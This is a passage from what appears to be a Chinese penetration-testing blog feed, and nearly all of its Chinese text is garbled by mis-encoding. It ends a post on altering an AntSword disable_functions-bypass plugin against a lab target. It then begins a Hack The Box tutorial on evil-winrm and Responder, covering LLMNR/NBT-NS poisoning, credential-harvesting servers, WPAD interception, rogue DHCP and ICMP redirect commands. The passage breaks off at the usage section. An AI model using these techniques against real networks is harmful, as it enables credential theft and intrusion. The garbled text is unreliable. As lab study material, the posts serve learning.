<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å®šä¹‰å’Œç”¨æ³•</span></span><br><span class="line"><span class="title function_ invoke__">str_repeat</span>() å‡½æ•°æŠŠå­—ç¬¦ä¸²é‡å¤æŒ‡å®šçš„æ¬¡æ•°ã€‚</span><br><span class="line"><span class="comment">#è¯­æ³•</span></span><br><span class="line"><span class="title function_ invoke__">str_repeat</span>(<span class="keyword">string</span>,repeat)</span><br><span class="line"><span class="comment">#å‚æ•°	   æè¿°</span></span><br><span class="line"><span class="keyword">string</span>	å¿…éœ€ã€‚è§„å®šè¦é‡å¤çš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line">repeat	å¿…éœ€ã€‚è§„å®šå­—ç¬¦ä¸²å°†è¢«é‡å¤çš„æ¬¡æ•°ã€‚å¿…é¡»å¤§äºç­‰äº <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p><code>str_shuffle</code>:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å®šä¹‰å’Œç”¨æ³•</span></span><br><span class="line"><span class="title function_ invoke__">str_shuffle</span>() å‡½æ•°éšæœºæ‰“ä¹±å­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰å­—ç¬¦ã€‚</span><br><span class="line"><span class="comment">#è¯­æ³•</span></span><br><span class="line"><span class="title function_ invoke__">str_shuffle</span>(<span class="keyword">string</span>)</span><br><span class="line"><span class="comment">#å‚æ•°	  æè¿°</span></span><br><span class="line"><span class="keyword">string</span>	å¿…éœ€ã€‚è§„å®šè¦æ‰“ä¹±çš„å­—ç¬¦ä¸²ã€‚</span><br></pre></td></tr></table></figure>
<p>ç¡®è®¤äº†å‡½æ•°åŠŸèƒ½ä¸‹é¢å°±æ˜¯æ‰‹åŠ¨å®ç°çš„è¿‡ç¨‹äº†ï¼Œ<code>str_repeat()</code>å°±æ˜¯ä¸€ä¸ªå¾ªç¯å°±èƒ½æ›¿ä»£ï¼Œè€Œ<code>str_shuffle()</code>å°±æ˜¯ä¸ºäº†éšæœºæ‰“ä¹±<code>str_repeat('A', 79)</code>æ‰€ç”Ÿæˆçš„æ•°ï¼Œè¿™é‡Œç”Ÿæˆçš„ä¸º79ä¸ªç›¸åŒçš„Aï¼Œæ‰“ä¹±ä¸å¦å¹¶ä¸é‡è¦ï¼Œæ‰€ä»¥<code>str_shuffle()</code>å®Œå…¨å¯ä»¥èˆå¼ƒæ‰ï¼Œé‚£ä¹ˆæ¥ä¸‹å•¦å°±æ˜¯æ‰‹åŠ¨å®ç°<code>str_repeat()</code>çš„è¿‡ç¨‹å’Œç»“æœå•¦ï¼š</p>
<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107033415836.png" alt="image-20231107033415836"></p>
<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107033340312.png" alt="image-20231107033340312"></p>
<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107033445350.png" alt="image-20231107033445350"></p>
<p>ä¿å­˜ä¹‹åé‡å¯èšå‰‘ï¼ˆantswordï¼‰ï¼ŒåŠ è½½PHP7_Backtrace_UAF_EXPæ’ä»¶</p>
<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107033803884.png" alt="image-20231107033803884"></p>
<p>ç»•è¿‡<strong>disable_function</strong>ï¼Œexpåˆ©ç”¨æˆåŠŸã€‚åˆ°æ­¤æœ¬æ–‡å°±ç»“æŸå•¦ï¼</p>
]]></content>
      <categories>
        <category>æ¸—é€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>web</tag>
        <tag>é¶åœº</tag>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>Responderä¸evil-winRMé…åˆè¿œç¨‹ç™»å½•windows</title>
    <url>/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/</url>
    <content><![CDATA[<p>æœ¬æ–‡ä»…ç”¨ä½œè®°å½•å­¦ä¹ å’Œæ€»ç»“ï¼Œæ–‡ä¸­æåˆ°å’Œä½¿ç”¨çš„é¶åœºæ¥è‡ªHack The Boxçš„Responderé¶åœºã€‚</p>
<span id="more"></span>
<h1 id="responderä¸evil-winrmé…åˆè¿œç¨‹ç™»å½•windows"><a class="markdownIt-Anchor" href="#responderä¸evil-winrmé…åˆè¿œç¨‹ç™»å½•windows"></a> Responderä¸evil-winRMé…åˆè¿œç¨‹ç™»å½•windows</h1>
<h2 id="0x01evil-winrm"><a class="markdownIt-Anchor" href="#0x01evil-winrm"></a> 0x01.evil-winRM</h2>
<h3 id="0x011æ¦‚è¿°"><a class="markdownIt-Anchor" href="#0x011æ¦‚è¿°"></a> 0x01.1æ¦‚è¿°</h3>
<p>åœ¨ä½¿ç”¨å’Œä»‹ç»Responderä¹‹å‰ï¼Œå…ˆæ¥äº†è§£ä¸€ä¸‹<code>evil-winRM</code>:</p>
<p><code>evil-winrm</code>æ˜¯Windowsè¿œç¨‹ç®¡ç†(WinRM) Shellçš„ç»ˆæç‰ˆæœ¬ã€‚</p>
<p>Windowsè¿œç¨‹ç®¡ç†æ˜¯WS ç®¡ç†åè®®çš„ Microsoft å®æ–½ï¼Œè¯¥åè®®æ˜¯åŸºäºæ ‡å‡† SOAPã€ä¸å—é˜²ç«å¢™å½±å“çš„åè®®ï¼Œå…è®¸ä¸åŒä¾›åº”å•†çš„ç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿç›¸äº’æ“ä½œã€‚è€Œå¾®è½¯å°†å…¶åŒ…å«åœ¨ä»–ä»¬çš„ç³»ç»Ÿä¸­ï¼Œæ˜¯ä¸ºäº†ä¾¿äºç³»ç»Ÿç®¡ç†å‘˜åœ¨æ—¥å¸¸å·¥ä½œä¸­ï¼Œè¿œç¨‹ç®¡ç†æœåŠ¡å™¨ï¼Œæˆ–é€šè¿‡è„šæœ¬åŒæ—¶ç®¡ç†å¤šå°æœåŠ¡å™¨ï¼Œä»¥æé«˜ä»–ä»¬çš„å·¥ä½œæ•ˆç‡ã€‚</p>
<p>æ­¤ç¨‹åºå¯åœ¨å¯ç”¨æ­¤åŠŸèƒ½çš„ä»»ä½•Microsoft WindowsæœåŠ¡å™¨ä¸Šä½¿ç”¨ï¼ˆé€šå¸¸ç«¯å£ä¸º5985ï¼‰ï¼Œå½“ç„¶åªæœ‰åœ¨ä½ å…·æœ‰ä½¿ç”¨å‡­æ®å’Œæƒé™æ—¶æ‰èƒ½ä½¿ç”¨ã€‚å› æ­¤ï¼Œæˆ‘ä»¬è¯´å®ƒå¯ç”¨äºé»‘å®¢æ”»å‡»çš„ååˆ©ç”¨/æ¸—é€æµ‹è¯•é˜¶æ®µã€‚ç›¸å¯¹äºæ”»å‡»è€…æ¥è¯´ï¼Œè¿™ä¸ªç¨‹åºèƒ½ä¸ºä»–ä»¬æä¾›æ›´å¥½æ›´ç®€å•æ˜“ç”¨çš„åŠŸèƒ½ã€‚å½“ç„¶ï¼Œç³»ç»Ÿç®¡ç†å‘˜ä¹Ÿå¯ä»¥å°†å…¶ç”¨äºåˆæ³•ç›®çš„ï¼Œä½†å…¶å¤§éƒ¨åˆ†åŠŸèƒ½éƒ½é›†ä¸­äºé»‘å®¢æ”»å‡»/æ¸—é€æµ‹è¯•ã€‚</p>
<h3 id="0x012å®‰è£…å’Œä½¿ç”¨"><a class="markdownIt-Anchor" href="#0x012å®‰è£…å’Œä½¿ç”¨"></a> 0x01.2å®‰è£…å’Œä½¿ç”¨</h3>
<h4 id="å®‰è£…"><a class="markdownIt-Anchor" href="#å®‰è£…"></a> å®‰è£…ï¼š</h4>
<p>æ–¹æ³•ä¸€</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install evil-winrm</span><br></pre></td></tr></table></figure>
<p>æ–¹æ³•äºŒï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Hackplayers/evil-winrm.git</span><br></pre></td></tr></table></figure>
<p>æ–¹æ³•ä¸‰ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gem install evil-winrm</span><br></pre></td></tr></table></figure>
<h4 id="ä½¿ç”¨"><a class="markdownIt-Anchor" href="#ä½¿ç”¨"></a> ä½¿ç”¨:</h4>
<p>é¦–å…ˆæŸ¥çœ‹å¸®åŠ©æ–‡æ¡£</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# evil-winrm -h</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">ç”¨æ³•ï¼ševil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r é¢†åŸŸ] [--spn SPN_PREFIX] [-l]</span><br><span class="line">     -S, --ssl å¯ç”¨ ssl</span><br><span class="line">     -c, --pub-key PUBLIC_KEY_PATH å…¬é’¥è¯ä¹¦çš„æœ¬åœ°è·¯å¾„</span><br><span class="line">     -k, --priv-key PRIVATE_KEY_PATH ç§é’¥è¯ä¹¦çš„æœ¬åœ°è·¯å¾„</span><br><span class="line">     -r, --realm DOMAIN Kerberos authï¼Œè¿˜å¿…é¡»ä½¿ç”¨æ­¤æ ¼å¼åœ¨ /etc/krb5.conf æ–‡ä»¶ä¸­è®¾ç½® -&gt; CONTOSO.COM = &#123; kdc = fooserver.contoso.com &#125;</span><br><span class="line">     -s, --scripts PS_SCRIPTS_PATH Powershell è„šæœ¬æœ¬åœ°è·¯å¾„</span><br><span class="line">         --spn SPN_PREFIX Kerberos èº«ä»½éªŒè¯çš„ SPN å‰ç¼€ï¼ˆé»˜è®¤ HTTPï¼‰</span><br><span class="line">     -e, --executables EXES_PATH C# å¯æ‰§è¡Œæ–‡ä»¶æœ¬åœ°è·¯å¾„</span><br><span class="line">     -i, --ip IP è¿œç¨‹ä¸»æœºIPæˆ–ä¸»æœºåã€‚ Kerberos èº«ä»½éªŒè¯çš„ FQDNï¼ˆå¿…éœ€ï¼‰</span><br><span class="line">     -U, --url URL è¿œç¨‹ url ç«¯ç‚¹ï¼ˆé»˜è®¤ /wsmanï¼‰</span><br><span class="line">     -u, --user USER ç”¨æˆ·åï¼ˆå¦‚æœä¸ä½¿ç”¨ kerberosï¼Œåˆ™éœ€è¦ï¼‰</span><br><span class="line">     -p, --password PASS å¯†ç </span><br><span class="line">     -H, --hash HASH NTHash</span><br><span class="line">     -P, --port PORT è¿œç¨‹ä¸»æœºç«¯å£ï¼ˆé»˜è®¤5985ï¼‰</span><br><span class="line">     -V, --version æ˜¾ç¤ºç‰ˆæœ¬</span><br><span class="line">     -n, --no-colors ç¦ç”¨é¢œè‰²</span><br><span class="line">     -N, --no-rpath-completion ç¦ç”¨è¿œç¨‹è·¯å¾„å®Œæˆ</span><br><span class="line">     -l, --log è®°å½• WinRM ä¼šè¯</span><br><span class="line">     -h, --help æ˜¾ç¤ºæ­¤å¸®åŠ©æ¶ˆæ¯</span><br></pre></td></tr></table></figure>
<h2 id="0x02responder"><a class="markdownIt-Anchor" href="#0x02responder"></a> 0x02.Responder</h2>
<h3 id="0x021-æ¦‚å¿µ"><a class="markdownIt-Anchor" href="#0x021-æ¦‚å¿µ"></a> 0x02.1 æ¦‚å¿µ</h3>
<p>å“åº” LLMNRã€NBT-NS å’Œ MDNS æŠ•æ¯’è€…ã€‚ å®ƒå°†æ ¹æ®åç§°åç¼€å›ç­”ç‰¹å®šçš„ NBT-NSï¼ˆNetBIOS åç§°æœåŠ¡ï¼‰æŸ¥è¯¢ï¼ˆè¯·å‚é˜…ï¼š<a href="http://support.microsoft.com/kb/163409%EF%BC%89%E3%80%82%E9%BB%98%E8%AE%A4%E6%83%85%E5%86%B5%E4%B8%8B%EF%BC%8C%E8%AF%A5%E5%B7%A5%E5%85%B7%E5%B0%86%E4%BB%85%E5%93%8D%E5%BA%94%E9%80%82%E7%94%A8%E4%BA%8E">http://support.microsoft.com/kb/163409ï¼‰ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¯¥å·¥å…·å°†ä»…å“åº”é€‚ç”¨äº</a> SMB çš„æ–‡ä»¶æœåŠ¡å™¨æœåŠ¡è¯·æ±‚ã€‚</p>
<h3 id="0x022-ç‰¹æ€§"><a class="markdownIt-Anchor" href="#0x022-ç‰¹æ€§"></a> 0x02.2 ç‰¹æ€§</h3>
<h4 id="å†…ç½®-smb-èº«ä»½éªŒè¯æœåŠ¡å™¨"><a class="markdownIt-Anchor" href="#å†…ç½®-smb-èº«ä»½éªŒè¯æœåŠ¡å™¨"></a> å†…ç½® SMB èº«ä»½éªŒè¯æœåŠ¡å™¨</h4>
<p>é»˜è®¤æƒ…å†µä¸‹æ”¯æŒå…·æœ‰æ‰©å±•å®‰å…¨æ€§ NTLMSSP çš„ NTLMv1ã€NTLMv2 å“ˆå¸Œã€‚ å·²æˆåŠŸæµ‹è¯•ä» Windows 95 åˆ° Server 2012 RCã€Samba å’Œ Mac OSX Lionã€‚ NT4 æ”¯æŒæ˜æ–‡å¯†ç ï¼Œå½“è®¾ç½®<code>--lm</code>é€‰é¡¹æ—¶ï¼ŒLM å“ˆå¸Œé™çº§ã€‚è¯¥å·¥å…·å¯åŠ¨æ—¶é»˜è®¤å¯ç”¨æ­¤åŠŸèƒ½ã€‚</p>
<h4 id="å†…ç½®-mssql-èº«ä»½éªŒè¯æœåŠ¡å™¨"><a class="markdownIt-Anchor" href="#å†…ç½®-mssql-èº«ä»½éªŒè¯æœåŠ¡å™¨"></a> å†…ç½® MSSQL èº«ä»½éªŒè¯æœåŠ¡å™¨</h4>
<p>ä¸ºäº†å°† SQL èº«ä»½éªŒè¯é‡å®šå‘åˆ°æ­¤å·¥å…·ï¼Œæ‚¨éœ€è¦ä¸º Windows Vista ä¹‹å‰çš„ç³»ç»Ÿè®¾ç½®é€‰é¡¹ -rï¼ˆç”¨äº SQL Server æŸ¥æ‰¾çš„ NBT-NS æŸ¥è¯¢ä½¿ç”¨å·¥ä½œç«™æœåŠ¡åç§°åç¼€ï¼‰ï¼ˆLLMNR å°†ç”¨äº Vista å’Œ æ›´é«˜ï¼‰ã€‚ è¯¥æœåŠ¡å™¨æ”¯æŒ NTLMv1ã€LMv2 å“ˆå¸Œã€‚ æ­¤åŠŸèƒ½å·²åœ¨ Windows SQL Server 2005 å’Œ 2008 ä¸ŠæˆåŠŸæµ‹è¯•ã€‚</p>
<h4 id="å†…ç½®-http-èº«ä»½éªŒè¯æœåŠ¡å™¨"><a class="markdownIt-Anchor" href="#å†…ç½®-http-èº«ä»½éªŒè¯æœåŠ¡å™¨"></a> å†…ç½® HTTP èº«ä»½éªŒè¯æœåŠ¡å™¨</h4>
<p>ä¸ºäº†å°† HTTP èº«ä»½éªŒè¯é‡å®šå‘åˆ°æ­¤å·¥å…·ï¼Œæ‚¨éœ€è¦ä¸ºæ—©äº Vista çš„ Windows ç‰ˆæœ¬è®¾ç½®é€‰é¡¹ -rï¼ˆç”¨äº HTTP æœåŠ¡å™¨æŸ¥æ‰¾çš„ NBT-NS æŸ¥è¯¢ä½¿ç”¨å·¥ä½œç«™æœåŠ¡åç§°åç¼€å‘é€ï¼‰ã€‚ å¯¹äº Vista åŠæ›´é«˜ç‰ˆæœ¬ï¼Œå°†ä½¿ç”¨ LLMNRã€‚ è¯¥æœåŠ¡å™¨æ”¯æŒ NTLMv1ã€NTLMv2 å“ˆå¸Œå’ŒåŸºæœ¬èº«ä»½éªŒè¯ã€‚ è¯¥æœåŠ¡å™¨å·²åœ¨ IE 6 è‡³ IE 10ã€Firefoxã€Chromeã€Safari ä¸ŠæˆåŠŸæµ‹è¯•ã€‚</p>
<p>æ³¨æ„ï¼šæ­¤æ¨¡å—ä¹Ÿé€‚ç”¨äºä» Windows WebDav å®¢æˆ·ç«¯ (WebClient) å‘å‡ºçš„ WebDav NTLM èº«ä»½éªŒè¯ã€‚ æ‚¨ç°åœ¨å¯ä»¥å°†è‡ªå®šä¹‰æ–‡ä»¶å‘é€ç»™å—å®³è€…ã€‚</p>
<h4 id="å†…ç½®-https-èº«ä»½éªŒè¯æœåŠ¡å™¨"><a class="markdownIt-Anchor" href="#å†…ç½®-https-èº«ä»½éªŒè¯æœåŠ¡å™¨"></a> å†…ç½® HTTPS èº«ä»½éªŒè¯æœåŠ¡å™¨</h4>
<p>ä¸ä¸Šé¢ç›¸åŒã€‚ æ–‡ä»¶å¤¹ certs/ åŒ…å« 2 ä¸ªé»˜è®¤å¯†é’¥ï¼Œå…¶ä¸­åŒ…æ‹¬ä¸€ä¸ªè™šæ‹Ÿç§é’¥ã€‚ è¿™æ˜¯æ•…æ„çš„ï¼Œç›®çš„æ˜¯è®© Responder å¼€ç®±å³ç”¨ã€‚ æ·»åŠ äº†ä¸€ä¸ªè„šæœ¬ï¼Œä»¥é˜²æ‚¨éœ€è¦ç”Ÿæˆè‡ªå·±çš„è‡ªç­¾åå¯†é’¥å¯¹ã€‚</p>
<h4 id="å†…ç½®-ldap-èº«ä»½éªŒè¯æœåŠ¡å™¨"><a class="markdownIt-Anchor" href="#å†…ç½®-ldap-èº«ä»½éªŒè¯æœåŠ¡å™¨"></a> å†…ç½® LDAP èº«ä»½éªŒè¯æœåŠ¡å™¨</h4>
<p>ä¸ºäº†å°† LDAP èº«ä»½éªŒè¯é‡å®šå‘åˆ°æ­¤å·¥å…·ï¼Œæ‚¨éœ€è¦ä¸ºæ—©äº Vista çš„ Windows ç‰ˆæœ¬è®¾ç½®é€‰é¡¹ -rï¼ˆç”¨äº HTTP æœåŠ¡å™¨æŸ¥æ‰¾çš„ NBT-NS æŸ¥è¯¢ä½¿ç”¨å·¥ä½œç«™æœåŠ¡åç§°åç¼€å‘é€ï¼‰ã€‚ å¯¹äº Vista åŠæ›´é«˜ç‰ˆæœ¬ï¼Œå°†ä½¿ç”¨ LLMNRã€‚ è¯¥æœåŠ¡å™¨æ”¯æŒ NTLMSSP å“ˆå¸Œå’Œç®€å•èº«ä»½éªŒè¯ï¼ˆæ˜æ–‡èº«ä»½éªŒè¯ï¼‰ã€‚ è¯¥æœåŠ¡å™¨å·²åœ¨ Windows æ”¯æŒå·¥å…·&quot;ldp&quot;å’Œ LdapAdmin ä¸ŠæˆåŠŸæµ‹è¯•ã€‚</p>
<h4 id="å†…ç½®-ftp-pop3-imap-smtp-èº«ä»½éªŒè¯æœåŠ¡å™¨"><a class="markdownIt-Anchor" href="#å†…ç½®-ftp-pop3-imap-smtp-èº«ä»½éªŒè¯æœåŠ¡å™¨"></a> å†…ç½® FTPã€POP3ã€IMAPã€SMTP èº«ä»½éªŒè¯æœåŠ¡å™¨</h4>
<p>è¯¥æ¨¡å—å°†æ”¶é›†æ˜æ–‡å‡­æ®</p>
<h4 id="å†…ç½®-dns-æœåŠ¡å™¨"><a class="markdownIt-Anchor" href="#å†…ç½®-dns-æœåŠ¡å™¨"></a> å†…ç½® DNS æœåŠ¡å™¨</h4>
<p>è¯¥æœåŠ¡å™¨å°†å›ç­” A ç±»æŸ¥è¯¢ã€‚ å½“å®ƒä¸ ARP æ¬ºéª—ç»“åˆèµ·æ¥æ—¶ï¼Œè¿™çœŸçš„å¾ˆæ–¹ä¾¿ã€‚</p>
<h4 id="å†…ç½®-wpad-ä»£ç†æœåŠ¡å™¨"><a class="markdownIt-Anchor" href="#å†…ç½®-wpad-ä»£ç†æœåŠ¡å™¨"></a> å†…ç½® WPAD ä»£ç†æœåŠ¡å™¨</h4>
<p>å¦‚æœå¯ç”¨äº†â€œè‡ªåŠ¨æ£€æµ‹è®¾ç½®â€ï¼Œæ­¤æ¨¡å—å°†æ•è·ç½‘ç»œä¸Šå¯åŠ¨ Internet Explorer çš„ä»»ä½•äººçš„æ‰€æœ‰ HTTP è¯·æ±‚ã€‚ è¯¥æ¨¡å—éå¸¸æœ‰æ•ˆã€‚ æ‚¨å¯ä»¥åœ¨ Responder.conf ä¸­é…ç½®è‡ªå®šä¹‰ PAC è„šæœ¬ï¼Œå¹¶å°† HTML æ³¨å…¥æœåŠ¡å™¨çš„å“åº”ä¸­ã€‚ è¯·å‚é˜… Responder.confã€‚</p>
<h4 id="æµè§ˆå™¨ç›‘å¬å™¨"><a class="markdownIt-Anchor" href="#æµè§ˆå™¨ç›‘å¬å™¨"></a> æµè§ˆå™¨ç›‘å¬å™¨</h4>
<p>è¯¥æ¨¡å—å…è®¸åœ¨éšèº«æ¨¡å¼ä¸‹æ‰¾åˆ° PDCã€‚</p>
<h4 id="æŒ‡çº¹è¯†åˆ«"><a class="markdownIt-Anchor" href="#æŒ‡çº¹è¯†åˆ«"></a> æŒ‡çº¹è¯†åˆ«</h4>
<p>å½“ä½¿ç”¨é€‰é¡¹ <code>-f </code>æ—¶ï¼Œå“åº”ç¨‹åºå°†å¯¹å‘å‡º LLMNR/NBT-NS æŸ¥è¯¢çš„æ¯ä¸ªä¸»æœºè¿›è¡ŒæŒ‡çº¹è¯†åˆ«ã€‚ æ‰€æœ‰é‡‡é›†æ¨¡å—åœ¨æŒ‡çº¹æ¨¡å¼ä¸‹ä»ç„¶å¯ä»¥å·¥ä½œã€‚</p>
<h4 id="icmp-é‡å®šå‘"><a class="markdownIt-Anchor" href="#icmp-é‡å®šå‘"></a> ICMP é‡å®šå‘</h4>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python tools/Icmp-Redirect.py</span><br></pre></td></tr></table></figure>
<p>é€‚ç”¨äº Windows XP/2003 åŠæ›´æ—©ç‰ˆæœ¬ä¸Šçš„ MITM åŸŸæˆå‘˜ã€‚ è¿™ç§æ”»å‡»ä¸ DNS æ¨¡å—ç›¸ç»“åˆéå¸¸æœ‰æ•ˆã€‚</p>
<h4 id="æµæ°“-dhcp"><a class="markdownIt-Anchor" href="#æµæ°“-dhcp"></a> æµæ°“ DHCP</h4>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python tools/DHCP.py</span><br></pre></td></tr></table></figure>
<p>DHCP é€šçŸ¥æ¬ºéª—ã€‚ å…è®¸æ‚¨è®©çœŸæ­£çš„ DHCP æœåŠ¡å™¨å‘å¸ƒ IP åœ°å€ï¼Œç„¶åå‘é€ DHCP Inform åº”ç­”ä»¥å°†æ‚¨çš„ IP åœ°å€è®¾ç½®ä¸ºä¸» DNS æœåŠ¡å™¨ï¼Œä»¥åŠæ‚¨è‡ªå·±çš„ WPAD URLã€‚</p>
<h4 id="åˆ†ææ¨¡å¼"><a class="markdownIt-Anchor" href="#åˆ†ææ¨¡å¼"></a> åˆ†ææ¨¡å¼</h4>
<p>è¯¥æ¨¡å—å…è®¸æ‚¨æŸ¥çœ‹ç½‘ç»œä¸Šçš„ NBT-NSã€BROWSERã€LLMNRã€DNS è¯·æ±‚ï¼Œè€Œä¸ä¼šç ´åä»»ä½•å“åº”ã€‚ æ­¤å¤–ï¼Œæ‚¨è¿˜å¯ä»¥è¢«åŠ¨æ˜ å°„åŸŸã€MSSQL æœåŠ¡å™¨ã€å·¥ä½œç«™ï¼Œçœ‹çœ‹ ICMP é‡å®šå‘æ”»å‡»åœ¨æ‚¨çš„å­ç½‘ä¸Šæ˜¯å¦å¯è¡Œã€‚</p>
<h3 id="0x023-responderæ¬ºéª—åŸç†"><a class="markdownIt-Anchor" href="#0x023-responderæ¬ºéª—åŸç†"></a> 0x02.3 Responderæ¬ºéª—åŸç†</h3>
<p>åœ¨ä½¿ç”¨Responderä¹‹å‰ï¼Œæˆ‘ä»¬è¦å…ˆäº†è§£windwosé»˜è®¤å¼€å¯çš„ä¸‰ç§åè®®ï¼Œè¿™ä¸‰ç§åè®®åˆ†åˆ«æ˜¯<strong>é“¾è·¯æœ¬åœ°å¤šæ’­åç§°è§£æï¼ˆLLMNRï¼‰</strong>ã€<strong>åç§°æœåŠ¡å™¨(NBNS) åè®®</strong>å’Œ<strong>å¤šæ’­DNSï¼ˆmdnsï¼‰åè®®</strong>ã€‚</p>
<h4 id="llmnr"><a class="markdownIt-Anchor" href="#llmnr"></a> LLMNR</h4>
<p>**é“¾è·¯æœ¬åœ°å¤šæ’­åç§°è§£æï¼ˆLLMNRï¼‰<strong>æ˜¯ä¸€ä¸ª</strong>åŸºäºåŸŸåç³»ç»Ÿï¼ˆDNSï¼‰**æ•°æ®åŒ…æ ¼å¼çš„åè®®ï¼ŒIPv4å’ŒIPv6çš„ä¸»æœºå¯ä»¥é€šè¿‡æ­¤åè®®å¯¹åŒä¸€æœ¬åœ°é“¾è·¯ä¸Šçš„ä¸»æœºæ‰§è¡Œåç§°è§£æã€‚Windows æ“ä½œç³»ç»Ÿä» Windows Vistaå¼€å§‹å°±å†…åµŒæ”¯æŒï¼ŒLinuxç³»ç»Ÿä¹Ÿé€šè¿‡systemdå®ç°äº†æ­¤åè®®ã€‚å®ƒé€šè¿‡UDP 5355ç«¯å£è¿›è¡Œé€šä¿¡ï¼Œä¸”LLMNRæ”¯æŒIPV6ã€‚</p>
<h4 id="nbns"><a class="markdownIt-Anchor" href="#nbns"></a> NBNS</h4>
<p>**ç½‘ç»œåŸºæœ¬è¾“å…¥/è¾“å‡ºç³»ç»Ÿ(NetBIOS) **åç§°æœåŠ¡å™¨(NBNS) åè®®æ˜¯ TCP/IP ä¸Šçš„ NetBIOS (NetBT) åè®®æ—çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒåœ¨åŸºäº NetBIOS åç§°è®¿é—®çš„ç½‘ç»œä¸Šæä¾›ä¸»æœºåå’Œåœ°å€æ˜ å°„æ–¹æ³•ã€‚é€šè¿‡UDP 137ç«¯å£è¿›è¡Œé€šä¿¡ï¼Œä½†NBNSä¸æ”¯æŒIPV6ã€‚</p>
<h4 id="mdns"><a class="markdownIt-Anchor" href="#mdns"></a> mDNS</h4>
<p>åœ¨è®¡ç®—æœºç½‘ç»œä¸­ ï¼Œ**å¤šæ’­DNSï¼ˆ mDNS ï¼‰<strong>åè®®å°†ä¸»æœºåè§£æä¸ºä¸åŒ…å«æœ¬åœ°åç§°æœåŠ¡å™¨çš„å°å‹ç½‘ç»œä¸­çš„IPåœ°å€ã€‚ å®ƒæ˜¯ä¸€ç§é›¶é…ç½®æœåŠ¡ï¼Œä½¿ç”¨ä¸</strong>å•æ’­åŸŸåç³»ç»Ÿï¼ˆDNSï¼‰**åŸºæœ¬ç›¸åŒçš„ç¼–ç¨‹æ¥å£ï¼Œæ•°æ®åŒ…æ ¼å¼å’Œæ“ä½œè¯­ä¹‰ã€‚ è™½ç„¶Stuart Cheshireå°†mDNSè®¾è®¡ä¸ºç‹¬ç«‹åè®®ï¼Œä½†å®ƒå¯ä»¥ä¸æ ‡å‡†DNSæœåŠ¡å™¨ååŒå·¥ä½œã€‚å®ƒé€šè¿‡UDP 5353ç«¯å£è¿›è¡Œé€šä¿¡ï¼Œä¸”mDNSä¹Ÿæ”¯æŒIPV6ã€‚</p>
<p>ç›®å‰ä»…æœ‰windows 10ä»¥ä¸Šçš„ç³»ç»Ÿæ”¯æŒmdnsï¼Œç»æµ‹è¯•å‘ç°ï¼Œç¦ç”¨äº†llmnråmdnsä¹Ÿä¼šè¢«ç¦ç”¨ã€‚</p>
<p><mark>æ€»çš„æ¥è¯´ï¼Œä»¥ä¸Šå‡ ç§åè®®åœ¨windowsä¸­éƒ½æ˜¯é»˜è®¤å¯ç”¨çš„ï¼Œä¸»è¦ä½œç”¨éƒ½æ˜¯åœ¨DNSæœåŠ¡å™¨è§£æå¤±è´¥åï¼Œå°è¯•å¯¹windowsä¸»æœºåç§°è¿›è¡Œè§£æï¼Œæ­£å› ä¸ºé»˜è®¤å¯ç”¨ã€ä¸”å®ç°æ–¹å¼åˆç±»ä¼¼äºARPåè®®ï¼Œå¹¶æ²¡æœ‰ä¸€ä¸ªè®¤è¯çš„è¿‡ç¨‹ï¼Œæ‰€ä»¥å°±ä¼šå¼•å‘å„ç§åŸºäºè¿™ä¸¤ç§åè®®çš„æ¬ºéª—è¡Œä¸ºï¼Œè€ŒResponderæ­£æ˜¯é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæ¬ºéª—å—å®³æœºå™¨ï¼Œå¹¶ä½¿å—å®³æœºå™¨åœ¨åç»­è®¤è¯ä¸­å‘é€å…¶å‡­è¯ã€‚</mark></p>
<h3 id="0x024-ä½¿ç”¨æ–¹æ³•"><a class="markdownIt-Anchor" href="#0x024-ä½¿ç”¨æ–¹æ³•"></a> 0x02.4 ä½¿ç”¨æ–¹æ³•</h3>
